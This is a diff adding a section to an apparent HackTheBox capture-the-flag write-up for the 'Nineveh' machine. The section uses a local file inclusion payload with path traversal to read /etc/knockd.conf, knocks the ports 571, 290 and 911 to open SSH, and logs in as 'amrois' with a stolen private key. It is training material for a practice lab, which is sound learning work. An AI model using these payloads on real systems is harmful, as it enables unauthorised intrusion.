@@ -538,3 +538,53 @@ We're in as `www-data`.
 # Gain Initial Access - Via Knockd
 
 <br />
+
+Another way to gain access to the system is using the LFI to list `knocd.conf` file and see the sequence of `port-knocking` that we need to follow to open temporarily the SSH port of the victime machine.
+
+Before perform this, we need to understand some key concepts:
+
+- `Port-knocking`: Is a security technique used to protect network services by requiring a specific sequence of connection attempts to closed ports before allowing access to a target service.
+
+- `knockd.conf`: The file `knockd.conf` is a configuration file used by the `knockd` daemon, which is a port-knocking server. It defines the sequences of network packets (or "knocks") that knockd will listen for and the actions to take when a valid sequence is received.
+
+Once we understood that, let's list the `knockd.conf` taking advantage of the LFI:
+
+<br />
+
+```bash
+http://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../etc/knockd.conf
+```
+![19](../../../assets/images/Nineveh/19.png)
+
+<br />
+
+We have the sequence to open SSH port: `571, 290, 911`.
+
+With this information, we will use `knock` to open the port 22 of the victim machine from our Linux system:
+
+<br />
+
+```bash
+knock 10.10.10.43 571 290 911
+```
+
+<br />
+
+And now we can authenticate as the user `amrois` using the `id_rsa` that we get from the `secure_notes` path image:
+
+<br />
+
+```bash
+❯ ssh -i id_rsa amrois@10.10.10.43
+...[snip]...
+You have mail.
+Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
+amrois@nineveh:~$ whoami
+amrois
+```
+
+<br />
+
+# Privilage Escalation: amrois -> root
+
+<br />
